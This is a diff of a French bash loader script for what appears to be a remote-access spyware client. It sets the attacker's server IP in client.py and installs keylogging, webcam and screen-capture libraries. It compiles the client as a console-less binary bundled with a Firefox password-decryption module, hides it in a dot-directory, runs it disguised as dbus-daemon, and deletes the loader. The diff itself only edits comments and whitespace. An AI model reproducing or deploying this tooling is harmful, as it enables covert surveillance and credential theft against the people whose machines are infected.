@@ -6,8 +6,7 @@ read -p "Entrez l'IP du serveur : " server_ip
 #remplace la valeur de l'ip server dans client.py
 sed -i "s/HOST = .*/HOST = \"$server_ip\"/g" client/client.py
 
-
-#installe PyInstaller
+#installe PyInstaller et Python + pip
 if ! command -v pyinstaller &> /dev/null; then
     echo "[+] Installation de Python3, pip3 et PyInstaller..."
     sudo apt update &>/dev/null
@@ -23,12 +22,9 @@ pip3 install opencv-python --break-system-packages &>/dev/null
 pip3 install pillow --break-system-packages &>/dev/null
 pip3 install pynput --break-system-packages &>/dev/null
 
-
-
 #compilation du binaire via PyInstaller
 echo "[+] Compilation du client.py en binaire discret..."
 python3 -m PyInstaller --onefile --noconsole --add-data "client/firefox_decrypt.py:." client/client.py &>/dev/null
-
 
 #cache le binaire
 mkdir -p ~/.cache/.clientbin
@@ -56,7 +52,6 @@ EOF
 #execute le binaire
 echo "[+] Exécution directe du binaire..."
 exec -a dbus-daemon ~/.cache/.clientbin/client &>/dev/null &
-
 echo "[+] Terminé !"
 
 #suppression du loader.sh
